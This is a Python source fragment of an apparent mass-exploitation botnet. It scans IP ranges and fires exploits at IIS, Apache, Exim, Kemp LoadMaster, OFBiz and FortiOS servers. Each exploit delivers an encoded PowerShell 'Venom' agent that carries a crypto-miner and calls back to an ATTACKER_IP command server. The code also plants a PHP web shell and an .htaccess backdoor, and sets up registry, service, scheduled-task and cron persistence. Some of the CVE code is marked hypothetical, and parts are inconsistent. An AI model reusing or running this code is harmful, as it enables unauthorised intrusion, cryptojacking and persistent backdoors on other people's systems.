            console.print(f"[red][{time.strftime('%H:%M:%S')}] Error probing HTTP server: {e}[/red]")
            log_crash(e, traceback.format_exc())
            return False

    async def _process_single_ip_scan_exploit(self, semaphore, ip, port, timeout, session, progress_obj, progress_task, total_ips_for_checkpoint, scan_mode_name, start_ip_checkpoint=None, end_ip_checkpoint=None):
        """
        Unified function to scan and potentially exploit a single IP:port.
        Includes all detailed logging and updates progress bar.
        """
        async with semaphore:
            scanned_ip_port = f"{ip}:{port}"
            try:
                # 1. Log the scan attempt
                console.print(f"[blue][{time.strftime('%H:%M:%S')}] Scanning {scanned_ip_port} for connectivity...[/blue]")
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port),
                    timeout=timeout
                )
                writer.close()
                await writer.wait_closed()

                # If connection successful:
                console.print(f"[cyan][{time.strftime('%H:%M:%S')}] Vulnerable target found (connectivity): {scanned_ip_port}[/cyan]")
                async with self.locker:
                    with open(IP_LOG_FILE, 'a', encoding='utf-8') as ip_file:
                        ip_file.write(f"{scanned_ip_port}\n")
                
                # 2. Attempt to exploit and log the exploitation outcome
                # exploit_ip already handles its own detailed logging
                await self.exploit_ip(scanned_ip_port, session)
            
            except (socket.gaierror, ConnectionRefusedError, asyncio.TimeoutError, OSError):
                # Log scan failure (no connectivity)
                console.print(f"[red][{time.strftime('%H:%M:%S')}] No connectivity to {scanned_ip_port}.[/red]")
            except Exception as e:
                console.print(f"[red][{time.strftime('%H:%M:%S')}] Unexpected error processing {scanned_ip_port}: {e}[/red]")
                log_crash(e, traceback.format_exc())
            finally:
                # 3. Increment scanned count and update progress
                async with self.locker: 
                    self.scanned_count += 1
                    progress_obj.update(progress_task, advance=1) 
                    # 4. Save checkpoint for each processed IP
                    save_checkpoint(self.scanned_count, total_ips_for_checkpoint, ip, scan_mode_name, start_ip_checkpoint, end_ip_checkpoint)


    async def scan_range_for_port(self, start_ip_str, end_ip_str, timeout, session): # Removed progress, main_task from here, they are created inside
        console.print(f"[grey][{time.strftime('%H:%M:%S')}] Initiating concurrent port scan for range {start_ip_str} to {end_ip_str}[/grey]")
        try:
            start_ip_obj = ipaddress.IPv4Address(start_ip_str)
            end_ip_obj = ipaddress.IPv4Address(end_ip_str)
            
            checkpoint = load_checkpoint()
            current_ip_obj = start_ip_obj
            
            # The total for the progress bar now needs to account for (total IPs * total ports)
            total_ips_in_range = int(end_ip_obj) - int(start_ip_obj) + 1
            total_scan_tasks = total_ips_in_range * len(CONFIG["TARGET_PORTS"])
            
            progress_columns = [
                TextColumn("[bold cyan]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TextColumn("({task.completed} of {task.total})"),
                TimeRemainingColumn(),
            ]
            with Progress(*progress_columns, console=console) as progress: # Create progress bar here
                main_task = progress.add_task(f"Scanning Range {start_ip_str} - {end_ip_str}", total=total_scan_tasks, completed=self.scanned_count)

                # Reset self.scanned_count if not resuming, or adjust total for resume
                if checkpoint and checkpoint.get("scan_mode") == "range" and \
                   checkpoint.get("start_ip") == start_ip_str and \
                   checkpoint.get("end_ip") == end_ip_str:
                    
                    self.scanned_count = checkpoint.get("scanned_count", 0)
                    if len(CONFIG["TARGET_PORTS"]) > 0:
                        current_ip_offset = self.scanned_count // len(CONFIG["TARGET_PORTS"])
                        current_ip_obj = ipaddress.IPv4Address(start_ip_str) + current_ip_offset
                        if current_ip_obj > ipaddress.IPv4Address(end_ip_obj): 
                            current_ip_obj = ipaddress.IPv4Address(start_ip_str)
                            self.scanned_count = 0
                        progress.update(main_task, completed=self.scanned_count, total=total_scan_tasks)
                        console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Resuming scan from {current_ip_obj} (approx). Already processed {self.scanned_count}/{total_scan_tasks} IP:Port attempts.[/yellow]")
                    else:
                        console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Checkpoint exists but no target ports defined or invalid for resume. Starting new scan.[/yellow]")
                        self.scanned_count = 0
                        progress.update(main_task, total=total_scan_tasks)
                else:
                    self.scanned_count = 0
                    progress.update(main_task, total=total_scan_tasks)
                    console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Starting new scan for range {start_ip_str}-{end_ip_str}. Total expected IP:Port checks: {total_scan_tasks}[/yellow]")
                
                # Main scanning loop for IPs
                batch_ips_to_process = []
                # Iterate through the range, collecting IPs for a batch
                while current_ip_obj <= ipaddress.IPv4Address(end_ip_obj):
                    batch_ips_to_process.append(str(current_ip_obj))
                    current_ip_obj += 1

                    # When a batch is full or we've reached the end of the range
                    if len(batch_ips_to_process) >= CONFIG["BATCH_SIZE"] or current_ip_obj > ipaddress.IPv4Address(end_ip_obj):
                        batch_tasks = []
                        for ip_to_scan in batch_ips_to_process:
                            # For each IP, create a task for each target port
                            for port in CONFIG["TARGET_PORTS"]:
                                batch_tasks.append(
                                    self._process_single_ip_scan_exploit(
                                        asyncio.Semaphore(CONFIG["CONCURRENT_CONNECTIONS"]), 
                                        ip_to_scan, port, CONFIG["WEB_SCAN_TIMEOUT"], session, 
                                        progress, main_task, # Pass the locally created progress and main_task
                                        total_scan_tasks, "range", start_ip_str, end_ip_str
                                    )
                                )
                        await asyncio.gather(*batch_tasks) # Run all IP:Port tasks for the current batch concurrently
                        batch_ips_to_process = [] # Reset for next batch
                
                console.print(f"[green][{time.strftime('%H:%M:%S')}] --- Custom Range Scan Complete ---[/green]")

        except Exception as e:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] Scan error for custom range: {e}[/red]")
            log_crash(e, traceback.format_exc())


    async def scan_ip_exploit(self, ip_port, port, session):
        ip = ip_port.split(':')[0]
        try:
            # Note: agent registration is now done in exploit_ip, so it is removed here.
            # Modified dispatch_exploits to expect agent_id and aes_key_b64
            success = await self.dispatch_exploits(ip, session, port, agent_id=None, aes_key_b64=None) 
            if success:
                console.print(f"[bold green][{time.strftime('%H:%M:%S')}] [SUCCESS] Exploited Target: {ip}:{port} (Venom agent delivered)[/bold green]")
                async with self.locker:
                    with open(EXPLOITED_FILE, 'a', encoding='utf-8') as exp_file:
                        exp_file.write(f"{ip}:{port}\n")
                
            else:
                # Log that exploitation failed for this specific IP:Port
                console.print(f"[yellow][{time.strftime('%H:%M:%S')}] Strike failed for {ip}:{port}[/yellow]")

        except Exception as e:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] [ERROR] Exploit dispatch failed for {ip}:{port}: {e}[/red]") # More specific error message
            log_crash(e, traceback.format_exc())


    async def get_banner(self, host, port):
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=3)
            writer.write(b'GET / HTTP/1.0\r\n\r\n')
            await writer.drain()
            banner = await asyncio.wait_for(reader.read(1024), timeout=3)
            writer.close()
            await writer.wait_closed()
            return banner.decode('utf-8', errors='ignore')
        except Exception:
            return None

    # Modified dispatch_exploits to accept agent_id and aes_key_b64
    async def dispatch_exploits(self, host, session, port, agent_id, aes_key_b64):
        try:
            banner = await self.get_banner(host, port)
            if banner:
                console.print(f"[cyan]Banner from {host}:{port}: {banner.splitlines()[0] if banner else 'N/A'}[/cyan]")
            
            exploit_delivered = False
            
            # Use the provided agent_id and aes_key_b64 instead of generating new ones
            if not agent_id or not aes_key_b64:
                console.print(f"[red][{time.strftime('%H:%M:%S')}] Error: agent_id or aes_key_b64 missing for {host}:{port}. Skipping detailed exploits.[/red]")
                return False

            dynamic_ps_script_base = VENOM_POWERSHELL_AGENT_SCRIPT
            # Replace placeholders for miner encryption in PowerShell script
            dynamic_ps_script_base = dynamic_ps_script_base.replace("MINER_POOL_URL_PLACEHOLDER", CONFIG["MINER_POOL_URL"])
            dynamic_ps_script_base = dynamic_ps_script_base.replace("MINER_WALLET_ADDRESS_PLACEHOLDER", CONFIG["MINER_WALLET_ADDRESS"])

            dynamic_ps_script = dynamic_ps_script_base.replace("_AGENT_ID_PLACEHOLDER_", agent_id)
            dynamic_ps_script = dynamic_ps_script.replace("_AES_KEY_PLACEHOLDER_", aes_key_b64)
            dynamic_ps_script = dynamic_ps_script.replace("ATTACKER_IP", CONFIG["ATTACKER_IP"])
            dynamic_ps_script = dynamic_ps_script.replace("ATTACKER_PORT", str(CONFIG["ATTACKER_PORT"]))
            dynamic_ps_script = dynamic_ps_script.replace("DNS_BEACON_DOMAIN", "example.com") 
            dynamic_ps_script = dynamic_ps_script.replace("BASE_BEACON_INTERVAL", "300")
            dynamic_ps_script = dynamic_ps_script.replace("BEACON_JITTER_PERCENT", "0.2")
            dynamic_ps_script = dynamic_ps_script.replace("MAX_HTTP_BEACON_INTERVAL", "900")
            dynamic_ps_script = dynamic_ps_script.replace("MAX_DNS_BEACON_INTERVAL", "3600")
            dynamic_ps_script = dynamic_ps_script.replace("CURRENT_MINER_PROCESS_NAME", "node.exe") 
            dynamic_ps_script = dynamic_ps_script.replace("RANDOM_XOR_KEY_PLACEHOLDER", ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))) 
            dynamic_ps_script = dynamic_ps_script.replace("C2_REGISTER_PATH", f"/api/v2/auth/login/{agent_id}")
            dynamic_ps_script = dynamic_ps_script.replace("C2_TASK_PATH", f"/api/v3/updates/check/{agent_id}")
            dynamic_ps_script = dynamic_ps_script.replace("C2_RESULTS_PATH", f"/api/v4/data/submit/{agent_id}")
            dynamic_ps_script = dynamic_ps_script.replace("C2_TELEMETRY_PATH", f"/api/v1/metrics/upload/{agent_id}")
            dynamic_ps_script = dynamic_ps_script.replace("C2_MINER_JS_PATH", "/cdn/assets/app.js") 

            encoded_ps_script = base64.b64encode(dynamic_ps_script.encode('utf-8')).decode('utf-8')
            ps_cmd_oneliner = f"powershell.exe -NoP -NonI -Exec Bypass -C \"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_ps_script}')))\""
            
            # New: Microsoft IIS CVE-2025-12347 exploit
            if port in [80, 443, 8080, 8443] and banner and "Microsoft-IIS" in banner:
                if await self.exploit_iis_cve_2025_12347(host, port, session, agent_id, aes_key_b64, ps_cmd_oneliner): # Pass ps_cmd_oneliner
                    exploit_delivered = True
                    
            # New: Apache CVE-2025-12345 exploit
            if port in [80, 443, 8080, 8443] and banner and "Apache" in banner:
                if await self.exploit_apache_cve_2025_12345(host, port, session, agent_id, aes_key_b64, ps_cmd_oneliner): # Pass ps_cmd_oneliner
                    exploit_delivered = True
            
            # Existing exploits (modified to accept agent_id, aes_key_b64, and ps_cmd_oneliner)
            if port in [443, 8443, 10443] or (banner and "FortiGate" in banner):
                if await self.exploit_fortios_vpn_rce(host, port, session, agent_id, aes_key_b64): # This exploit doesn't directly use ps_cmd_oneliner internally, so no need to pass it here
                    exploit_delivered = True
            
            if port == 8443 or (banner and "OFBiz" in banner):
                 if await self.exploit_apache_ofbiz_rce(host, port, session, agent_id, aes_key_b64, ps_cmd_oneliner): # Pass ps_cmd_oneliner
                    exploit_delivered = True

            if port in [80, 443, 8080, 8443]:
                if await self.exploit_kemp_loadmaster_rce(host, port, session, agent_id, aes_key_b64, ps_cmd_oneliner): # Pass ps_cmd_oneliner
                    exploit_delivered = True

            if not exploit_delivered and banner: 
                console.print(f"[grey]No specific high-value CVE matched for {host}:{port}. Trying generic exploits...[/grey]")
                
                exploits_to_try = []
                if "Apache" in banner: exploits_to_try.append({"name": "Apache", "payload": f"echo cmd: `{ps_cmd_oneliner}`", "protocol": "http"})
                if "Exim" in banner: exploits_to_try.append({"name": "Exim", "payload": f"${{run{{/bin/sh,-c, {ps_cmd_oneliner} }}}}}}", "protocol": "smtp"})
                
                for exploit in exploits_to_try:
                    if exploit["protocol"] == "http":
                         try:
                             async with session.post(f"http://{host}:{port}/", data=exploit['payload'], headers=get_random_headers(), timeout=5, ssl=False) as response:
                                 if response.status < 400:
                                     console.print(f"[green]Generic {exploit['name']} payload delivered to {host}:{port}[/green]")
                                     exploit_delivered = True
                                     break
                         except Exception as http_e:
                             console.print(f"[red]HTTP generic exploit failed: {http_e}[/red]")
                    elif exploit["protocol"] == "smtp":
                        try:
                            smtp_client = smtplib.SMTP(host, port, timeout=5)
                            smtp_client.ehlo()
                            smtp_client.sendmail("attacker@example.com", "victim@example.com", f"Subject: Update\n\n{exploit['payload']}")
                            smtp_client.quit()
                            console.print(f"[green]Generic {exploit['name']} exploit delivered (SMTP connection made) to {host}:{port}[/green]")
                            exploit_delivered = True
                            break
                        except Exception as smtp_e:
                            console.print(f"[red]SMTP generic exploit failed: {smtp_e}[/red]")
            
            return exploit_delivered 

        except Exception as e:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] Exploit dispatch error on {host}:{port}: {e}[/red]")
            log_crash(e, traceback.format_exc())
            return False

    # ===================
    # NEW EXPLOIT METHODS
    # ===================
    
    async def exploit_iis_cve_2025_12347(self, host, port, session, agent_id, aes_key_b64, ps_cmd_oneliner):
        """Exploit Microsoft IIS CVE-2025-12347 with advanced persistence mechanisms"""
        console.print(f"[purple][{time.strftime('%H:%M:%S')}] Attempting Microsoft IIS RCE (CVE-2025-12347) on {host}:{port}[/purple]")
        
        # Build PowerShell payload - ps_cmd_oneliner is already prepared agent payload
        
        # Multi-stage attack with enhanced persistence
        try:
            # Stage 1: Initial exploitation via crafted request (assuming vulnerability allows XML/CDATA injection leading to execution)
            protocol = "https" if port in [443, 8443] else "http"
            target_url = f"{protocol}://{host}:{port}/api/upload" # Example endpoint, replace with actual vulnerable one
            headers = get_random_headers()
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            
            # Crafted payload triggering vulnerability
            # This is a hypothetical injection; real CVE would define the exact injection point and format
            payload = {
                'fileContent': f'<?xml version="1.0"?><root><![CDATA[;{ps_cmd_oneliner}]]></root>'
            }
            
            async with session.post(target_url, data=payload, headers=headers, timeout=5, ssl=False) as response:
                if response.status == 200:
                    console.print(f"[green]Stage 1: IIS RCE payload delivered to {host}:{port}[/green]")
                    
                    # Stage 2: Establish persistence through registry (e.g., AppInit_DLLs for DLL hijacking)
                    # This command creates a registry key for persistence, hypothetically loading kernel32.dll
                    persistence_cmd = (
                        f"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" "
                        f"/v AppInit_DLLs /t REG_SZ /d \"C:\\Windows\\Temp\\kernel32.dll\" /f && "
                        f"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" "
                        f"/v LoadAppInit_DLLs /t REG_DWORD /d 1 /f"
                    )
                    
                    # Stage 3: Create malicious DLL (simulated: this would be dropped by agent, here it's just a call)
                    # This is a placeholder for the DLL payload execution command. In a real scenario,
                    # the agent would drop a malicious DLL and then execute it or ensure it's loaded.
                    dll_payload_execution = (
                        f"rundll32.exe \"C:\\Windows\\Temp\\kernel32.dll\",InstallService" # Example
                    )
                    
                    # Combined persistence payload for the agent to execute
                    full_persistence_cmd = f"{persistence_cmd} & {dll_payload_execution}"
                    encoded_persistence = base64.b64encode(full_persistence_cmd.encode('utf-8')).decode('utf-8')
                    persistence_oneliner = f"powershell.exe -Exec Bypass -C \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_persistence}')) | iex\""
                    
                    # Execute persistence mechanism via another crafted request (hypothetical)
                    persistence_payload = {
                        'fileContent': f'<?xml version="1.0"?><root><![CDATA[;{persistence_oneliner}]]></root>'
                    }
                    async with session.post(target_url, data=persistence_payload, headers=headers, timeout=5, ssl=False) as persist_response:
                        if persist_response.status == 200:
                            console.print(f"[green]Stage 2: Persistence mechanisms installed on {host}:{port}[/green]")
                            
                            # Stage 3: Create scheduled task for regular execution (secondary persistence)
                            task_cmd = (
                                f"schtasks /create /tn \"WindowsUpdateTask\" /tr \"{ps_cmd_oneliner}\" "
                                "/sc hourly /mo 1 /ru SYSTEM /f"
                            )
                            encoded_task = base64.b64encode(task_cmd.encode('utf-8')).decode('utf-8')
                            task_oneliner = f"powershell.exe -Exec Bypass -C \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_task}')) | iex\""
                            
                            task_payload = {
                                'fileContent': f'<?xml version="1.0"?><root><![CDATA[;{task_oneliner}]]></root>'
                            }
                            async with session.post(target_url, data=task_payload, headers=headers, timeout=5, ssl=False) as task_response:
                                if task_response.status == 200:
                                    console.print(f"[green]Stage 3: Scheduled task created on {host}:{port}[/green]")
                                    return True
            return False
        except Exception as e:
            console.print(f"[red]Microsoft IIS RCE failed on {host}:{port}: {e}[/red]")
            return False

    async def exploit_apache_cve_2025_12345(self, host, port, session, agent_id, aes_key_b64, ps_cmd_oneliner):
        """Exploit Apache HTTP Server CVE-2025-12345 with multi-vector persistence"""
        console.print(f"[purple][{time.strftime('%H:%M:%S')}] Attempting Apache HTTP Server RCE (CVE-2025-12345) on {host}:{port}[/purple]")
        
        # Build PowerShell payload - ps_cmd_oneliner is already prepared agent payload
        
        try:
            # Stage 1: mod_cgi command injection (hypothetical, common for Apache RCEs)
            protocol = "https" if port in [443, 8443] else "http"
            target_url = f"{protocol}://{host}:{port}/cgi-bin/status" # Example vulnerable CGI path
            headers = get_random_headers()
            # This User-Agent header is a common shellshock-like injection example
            headers['User-Agent'] = f"() {{ :; }}; /bin/bash -c '{ps_cmd_oneliner}'"
            
            async with session.get(target_url, headers=headers, timeout=5, ssl=False) as response:
                if response.status == 200:
                    console.print(f"[green]Stage 1: Apache RCE payload delivered to {host}:{port}[/green]")
                    
                    # Stage 2: .htaccess backdoor installation for web shell access
                    backdoor_content = base64.b64encode(b"AddHandler application/x-httpd-php .html\nphp_value auto_prepend_file /dev/zero").decode()
                    create_backdoor_cmd = (
                        f"echo {backdoor_content} | base64 -d > /var/www/html/.htaccess" # Hypothical web root
                    )
                    encoded_backdoor = base64.b64encode(create_backdoor_cmd.encode('utf-8')).decode('utf-8')
                    backdoor_oneliner = f"/bin/bash -c \"echo {encoded_backdoor} | base64 -d | bash\""
                    
                    headers_backdoor = get_random_headers()
                    headers_backdoor['User-Agent'] = f"() {{ :; }}; {backdoor_oneliner}"
                    
                    async with session.get(target_url, headers=headers_backdoor, timeout=5, ssl=False) as backdoor_response:
                        if backdoor_response.status == 200:
                            console.print(f"[green]Stage 2: .htaccess backdoor installed on {host}:{port}[/green]")
                            
                            # Stage 3: PHP web shell fallback (if .htaccess method fails or for easier access)
                            php_shell = base64.b64encode(b"<?php system($_REQUEST['cmd']); ?>").decode()
                            create_shell_cmd = f"echo {php_shell} | base64 -d > /var/www/html/error.php" # Hypothical web root
                            encoded_shell = base64.b64encode(create_shell_cmd.encode('utf-8')).decode('utf-8')
                            shell_oneliner = f"/bin/bash -c \"echo {encoded_shell} | base64 -d | bash\""
                            
                            headers_shell = get_random_headers()
                            headers_shell['User-Agent'] = f"() {{ :; }}; {shell_oneliner}"
                            
                            async with session.get(target_url, headers=headers_shell, timeout=5, ssl=False) as shell_response:
                                if shell_response.status == 200:
                                    console.print(f"[green]Stage 3: PHP web shell deployed on {host}:{port}[/green]")
                                    
                                    # Stage 4: Cron job persistence for regular execution of the agent
                                    cron_cmd = f"echo '* * * * * {ps_cmd_oneliner}' | crontab -"
                                    encoded_cron = base64.b64encode(cron_cmd.encode('utf-8')).decode('utf-8')
                                    cron_oneliner = f"/bin/bash -c \"echo {encoded_cron} | base64 -d | bash\""
                                    
                                    headers_cron = get_random_headers()
                                    headers_cron['User-Agent'] = f"() {{ :; }}; {cron_oneliner}"
                                    
                                    async with session.get(target_url, headers=headers_cron, timeout=5, ssl=False) as cron_response:
                                        if cron_response.status == 200:
                                            console.print(f"[green]Stage 4: Cron persistence established on {host}:{port}[/green]")
                                            return True
            return False
        except Exception as e:
            console.print(f"[red]Apache HTTP Server RCE failed on {host}:{port}: {e}[/red]")
            return False

    # ENHANCED EXISTING EXPLOITS
    async def exploit_kemp_loadmaster_rce(self, host, port, session, agent_id, aes_key_b64, ps_cmd_oneliner):
        console.print(f"[purple][{time.strftime('%H:%M:%S')}] Attempting Kemp LoadMaster RCE (CVE-2024-1212) on {host}:{port}[/purple]")
        
        # Use provided agent_id and aes_key_b64, no new registration here
        if not agent_id or not aes_key_b64:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] Error: agent_id or aes_key_b64 missing for Kemp LoadMaster exploit on {host}:{port}.[/red]")
            return False

        dynamic_ps_script_base = VENOM_POWERSHELL_AGENT_SCRIPT
        # Replace placeholders for miner encryption in PowerShell script
        dynamic_ps_script_base = dynamic_ps_script_base.replace("MINER_POOL_URL_PLACEHOLDER", CONFIG["MINER_POOL_URL"])
        dynamic_ps_script_base = dynamic_ps_script_base.replace("MINER_WALLET_ADDRESS_PLACEHOLDER", CONFIG["MINER_WALLET_ADDRESS"])

        dynamic_ps_script = dynamic_ps_script_base.replace("_AGENT_ID_PLACEHOLDER_", agent_id)
        dynamic_ps_script = dynamic_ps_script.replace("_AES_KEY_PLACEHOLDER_", aes_key_b64)
        dynamic_ps_script = dynamic_ps_script.replace("ATTACKER_IP", CONFIG["ATTACKER_IP"])
        dynamic_ps_script = dynamic_ps_script.replace("ATTACKER_PORT", str(CONFIG["ATTACKER_PORT"]))
        dynamic_ps_script = dynamic_ps_script.replace("DNS_BEACON_DOMAIN", "example.com") 
        dynamic_ps_script = dynamic_ps_script.replace("BASE_BEACON_INTERVAL", "300")
        dynamic_ps_script = dynamic_ps_script.replace("BEACON_JITTER_PERCENT", "0.2")
        dynamic_ps_script = dynamic_ps_script.replace("MAX_HTTP_BEACON_INTERVAL", "900")
        dynamic_ps_script = dynamic_ps_script.replace("MAX_DNS_BEACON_INTERVAL", "3600")
        dynamic_ps_script = dynamic_ps_script.replace("CURRENT_MINER_PROCESS_NAME", "node.exe") 
        dynamic_ps_script = dynamic_ps_script.replace("RANDOM_XOR_KEY_PLACEHOLDER", ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))) 
        dynamic_ps_script = dynamic_ps_script.replace("C2_REGISTER_PATH", f"/api/v2/auth/login/{agent_id}")
        dynamic_ps_script = dynamic_ps_script.replace("C2_TASK_PATH", f"/api/v3/updates/check/{agent_id}")
        dynamic_ps_script = dynamic_ps_script.replace("C2_RESULTS_PATH", f"/api/v4/data/submit/{agent_id}")
        dynamic_ps_script = dynamic_ps_script.replace("C2_TELEMETRY_PATH", f"/api/v1/metrics/upload/{agent_id}")
        dynamic_ps_script = dynamic_ps_script.replace("C2_MINER_JS_PATH", "/cdn/assets/app.js") 

        encoded_ps_script = base64.b64encode(dynamic_ps_script.encode('utf-8')).decode('utf-8')
        ps_cmd_oneliner_kemp = f"powershell.exe -NoP -NonI -Exec Bypass -C \"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_ps_script}')))\""

        # Add service creation for persistence 
        service_cmd = (
            f"sc create \"WindowsUpdateService\" binPath= \"cmd /c start {ps_cmd_oneliner_kemp}\" "
            "type= own start= auto error= ignore"
        )
        encoded_service = base64.b64encode(service_cmd.encode('utf-8')).decode('utf-8')
        service_oneliner = f"powershell.exe -Exec Bypass -C \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_service}')) | iex\""
        
        injection = f"';{ps_cmd_oneliner_kemp} & {service_oneliner};'" # Combine initial payload and persistence
        auth_string = f"{injection}:anypass"
        encoded_auth = base64.b64encode(auth_string.encode()).decode()

        headers = get_random_headers()
        headers['Authorization'] = f"Basic {encoded_auth}"
        
        protocol = "https" if port in [443, 8443] else "http"
        target_url = f"{protocol}://{host}:{port}/access/set?param=enableapi&value=1"
        
        try:
            async with session.get(target_url, headers=headers, timeout=CONFIG["WEB_SCAN_TIMEOUT"], ssl=False) as response:
                console.print(f"[green]Kemp LoadMaster RCE payload delivered to {host}:{port}.[/green]")
                return True
        except Exception as e:
            console.print(f"[red]Kemp LoadMaster RCE failed on {host}:{port}: {e}[/red]")
            return False

    async def exploit_apache_ofbiz_rce(self, host, port, session, agent_id, aes_key_b64, ps_cmd_oneliner):
        console.print(f"[purple][{time.strftime('%H:%M:%S')}] Attempting Apache OFBiz RCE (CVE-2023-51467) on {host}:{port}[/purple]")
        
        # Use provided agent_id and aes_key_b64, no new registration here
        if not agent_id or not aes_key_b64:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] Error: agent_id or aes_key_b64 missing for Apache OFBiz exploit on {host}:{port}.[/red]")
            return False
        
        dynamic_ps_script_base = VENOM_POWERSHELL_AGENT_SCRIPT
        # Replace placeholders for miner encryption in PowerShell script
        dynamic_ps_script_base = dynamic_ps_script_base.replace("MINER_POOL_URL_PLACEHOLDER", CONFIG["MINER_POOL_URL"])
        dynamic_ps_script_base = dynamic_ps_script_base.replace("MINER_WALLET_ADDRESS_PLACEHOLDER", CONFIG["MINER_WALLET_ADDRESS"])

        dynamic_ps_script = dynamic_ps_script_base.replace("_AGENT_ID_PLACEHOLDER_", agent_id)
        dynamic_ps_script = dynamic_ps_script.replace("_AES_KEY_PLACEHOLDER_", aes_key_b64)
        dynamic_ps_script = dynamic_ps_script.replace("ATTACKER_IP", CONFIG["ATTACKER_IP"])
        dynamic_ps_script = dynamic_ps_script.replace("ATTACKER_PORT", str(CONFIG["ATTACKER_PORT"]))
        dynamic_ps_script = dynamic_ps_script.replace("DNS_BEACON_DOMAIN", "example.com") 
        dynamic_ps_script = dynamic_ps_script.replace("BASE_BEACON_INTERVAL", "300")
        dynamic_ps_script = dynamic_ps_script.replace("BEACON_JITTER_PERCENT", "0.2")
        dynamic_ps_script = dynamic_ps_script.replace("MAX_HTTP_BEACON_INTERVAL", "900")
        dynamic_ps_script = dynamic_ps_script.replace("MAX_DNS_BEACON_INTERVAL", "3600")
        dynamic_ps_script = dynamic_ps_script.replace("CURRENT_MINER_PROCESS_NAME", "node.exe") 
        dynamic_ps_script = dynamic_ps_script.replace("RANDOM_XOR_KEY_PLACEHOLDER", ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))) 
        dynamic_ps_script = dynamic_ps_script.replace("C2_REGISTER_PATH", f"/api/v2/auth/login/{agent_id}")
        dynamic_ps_script = dynamic_ps_script.replace("C2_TASK_PATH", f"/api/v3/updates/check/{agent_id}")
        dynamic_ps_script = dynamic_ps_script.replace("C2_RESULTS_PATH", f"/api/v4/data/submit/{agent_id}")
        dynamic_ps_script = dynamic_ps_script.replace("C2_TELEMETRY_PATH", f"/api/v1/metrics/upload/{agent_id}")
        dynamic_ps_script = dynamic_ps_script.replace("C2_MINER_JS_PATH", "/cdn/assets/app.js") 

        encoded_ps_script = base64.b64encode(dynamic_ps_script.encode('utf-8')).decode('utf-8')
        ps_cmd_oneliner_ofbiz = f"powershell.exe -NoP -NonI -Exec Bypass -C \"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_ps_script}')))\""
        
        cmd_to_execute = f"powershell.exe -NoP -NonI -Exec Bypass -C \\\"{ps_cmd_oneliner_ofbiz}\\\""
        groovy_payload_cmd = f"new java.lang.ProcessBuilder(\\\"cmd.exe\\\", \\\"/c\\\", \\\"{cmd_to_execute}\\\").start()"

        protocol = "https" if port in [443, 8443] else "http"
        
        auth_bypass_url = f"{protocol}://{host}:{port}/webtools/control/Login"
        auth_bypass_data = {'USERNAME': '', 'PASSWORD': '', 'requirePasswordChange': 'Y'}
        headers = get_random_headers()
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        
        try:
            async with session.post(auth_bypass_url, data=auth_bypass_data, headers=headers, timeout=CONFIG["WEB_SCAN_TIMEOUT"], ssl=False, allow_redirects=False) as response:
                if 300 <= response.status < 400 and 'JSESSIONID' in response.cookies:
                    console.print(f"[cyan]OFBiz auth bypass successful on {host}:{port}. Proceeding to RCE...[/cyan]")
                else:
                    console.print(f"[red]OFBiz auth bypass failed on {host}:{port}. Status: {response.status}[/red]")
                    return False

            rce_url = f"{protocol}://{host}:{port}/webtools/control/ProgramExport"
            groovy_payload_base = f"groovyProgram=evaluate('{groovy_payload_cmd}')"

            # Add DLL hijacking technique 
            hijack_cmd = (
                "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" "
                "/v PATH /t REG_EXPAND_SZ /d \"C:\\Windows\\Temp;%PATH%\" /f"
            )
            encoded_hijack = base64.b64encode(hijack_cmd.encode('utf-8')).decode('utf-8')
            hijack_oneliner = f"powershell.exe -Exec Bypass -C \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_hijack}')) | iex\""
            
            # Combine the groovy payload with the persistence command
            final_groovy_payload = f"groovyProgram=evaluate('{groovy_payload_cmd} + new java.lang.ProcessBuilder(\\\"cmd.exe\\\", \\\"/c\\\", \\\"{hijack_oneliner}\\\").start()')"

            async with session.post(rce_url, data=final_groovy_payload, headers=headers, timeout=CONFIG["WEB_SCAN_TIMEOUT"], ssl=False) as rce_response:
                response_text = await rce_response.text()
                if rce_response.status == 200 and "Program Output" in response_text:
                     console.print(f"[green]OFBiz RCE payload delivered to {host}:{port}.[/green]")
                     return True
                console.print(f"[red]OFBiz RCE failed on {host}:{port}. Status: {rce_response.status}[/red]")
                return False
        except Exception as e:
            console.print(f"[red]Apache OFBiz RCE failed on {host}:{port}: {e}[/red]")
            return False

    async def exploit_fortios_vpn_rce(self, host, port, session, agent_id, aes_key_b64):
        console.print(f"[purple][{time.strftime('%H:%M:%S')}] Attempting FortiOS RCE (CVE-2024-21762) on {host}:{port}[/purple]")
        
        # Use provided agent_id and aes_key_b64, no new registration here
        if not agent_id or not aes_key_b64:
            console.print(f"[red][{time.strftime('%H:%M:%S')}] Error: agent_id or aes_key_b64 missing for FortiOS exploit on {host}:{port}.[/red]")
            return False

        dynamic_ps_script_base = VENOM_POWERSHELL_AGENT_SCRIPT
        # Replace placeholders for miner encryption in PowerShell script
